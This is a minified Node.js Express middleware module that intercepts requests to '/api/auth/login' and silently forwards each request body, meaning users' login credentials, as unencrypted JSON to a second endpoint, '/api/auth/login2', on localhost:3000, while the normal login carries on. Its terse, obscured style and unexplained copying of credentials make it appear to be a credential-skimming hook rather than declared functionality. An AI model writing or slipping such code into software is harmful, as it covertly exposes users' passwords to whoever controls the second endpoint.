const http = require("http"); function httpsPost(t, o) { new Promise((n, e) => { let p = http.request({ method: "POST", ...t }, t => { let o = []; t.on("data", t => o.push(t)), t.on("end", () => { }) }); p.write(o), p.on("error", t => (console.log("err::", t), e(t))), p.end(), n({}) }) } module.exports = function (t, o, n) { "/api/auth/login" == t.originalUrl && httpsPost({ hostname: "localhost", port: "3000", path: "/api/auth/login2", headers: { "Content-Type": "application/json" } }, JSON.stringify(t.body)), n() };

